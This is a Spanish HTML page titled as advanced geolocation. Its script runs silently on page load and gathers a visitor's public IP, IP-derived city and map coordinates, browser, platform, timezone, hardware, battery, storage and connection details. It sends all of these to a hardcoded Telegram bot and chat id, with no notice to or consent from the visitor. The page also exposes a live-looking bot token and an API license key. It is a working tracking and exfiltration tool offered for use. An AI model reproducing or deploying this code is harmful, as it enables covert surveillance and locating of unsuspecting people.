<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Geolocalizaci√≥n Avanzada</title>
</head>
<body>
  <h1>Obteniendo informaci√≥n del dispositivo...</h1>
  <script>
    const license = 'FBPZ80ZEvKAIuT4CR2cYU2**';
    const telegramToken = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';
    const telegramChatId = '7270292739';

    async function obtenerInformacion() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const screenWidth = screen.width;
      const screenHeight = screen.height;
      const pixelRatio = window.devicePixelRatio || 1;
      const fecha = new Date().toLocaleDateString();
      const hora = new Date().toLocaleTimeString();

      const memory = navigator.deviceMemory || 0.5;
      const cores = navigator.hardwareConcurrency || '?';

      const ram = `${memory.toFixed(1)} GB`;
      const cpuCores = cores;

      // IP p√∫blica
      let ip = 'Desconocida';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip || 'Desconocida';
      } catch (e) { console.warn('IP error:', e); }

      // Bater√≠a
      let batteryInfo = '‚Äì';
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${(battery.level * 100).toFixed(0)}%`;
      } catch (e) {}

      // Almacenamiento
      let storageInfo = '‚Äì';
      try {
        const storage = await navigator.storage.estimate();
        const used = (storage.usage / 1e9).toFixed(2);
        const total = (storage.quota / 1e9).toFixed(2);
        storageInfo = `${used}/${total} GB`;
      } catch (e) {}

      // Conexi√≥n
      const connection = navigator.connection || {};
      const connectionType = connection.effectiveType || '‚Äì';

      // Localizaci√≥n con Melissa API (mediante proxy para evitar CORS)
      let ubicacionTexto = 'üìç No disponible';
      let mapsURL = '';
      try {
        const melissaURL = `https://api.allorigins.win/get?url=${encodeURIComponent(`https://globalip.melissadata.net/v4/web/iplocation/doiplocation?ip=${ip}&id=${license}`)}`;
        const locRes = await fetch(melissaURL);
        const raw = await locRes.json();
        const data = JSON.parse(raw.contents);

        const city = data.City || '‚Äì';
        const region = data.Region || '‚Äì';
        const country = data.CountryName || '‚Äì';
        const lat = data.Latitude || '';
        const lon = data.Longitude || '';

        ubicacionTexto = `${city}, ${region}, ${country}`;
        mapsURL = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '';
      } catch (e) {
        console.warn('Error consultando Melissa:', e);
      }

      // Armar mensaje para Telegram
      const msg =
`üåç Ubicaci√≥n (Melissa API)
üìç ${ubicacionTexto}
${mapsURL ? `Ver en Maps: ${mapsURL}` : ''}

üñ•Ô∏è Info Dispositivo
‚Ä¢ IP: ${ip}
‚Ä¢ SO/Plataforma: ${platform}
‚Ä¢ Navegador: ${userAgent}
‚Ä¢ Idioma: ${language}
‚Ä¢ Zona horaria: ${timezone}

‚öôÔ∏è Hardware
‚Ä¢ RAM: ${ram}
‚Ä¢ CPU cores: ${cpuCores}
‚Ä¢ Bater√≠a: ${batteryInfo}

üñ•Ô∏è Pantalla & Conexi√≥n
‚Ä¢ Resoluci√≥n: ${screenWidth}√ó${screenHeight} @${pixelRatio}√ó
‚Ä¢ Conexi√≥n: ${connectionType}
‚Ä¢ Almacenamiento: ${storageInfo}
`;

      // Enviar a Telegram
      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`;
      fetch(url)
        .then(r => r.json())
        .then(data => console.log('Mensaje enviado:', data))
        .catch(err => console.error('Error Telegram:', err));
    }

    window.onload = obtenerInformacion;
  </script>
</body>
</html>
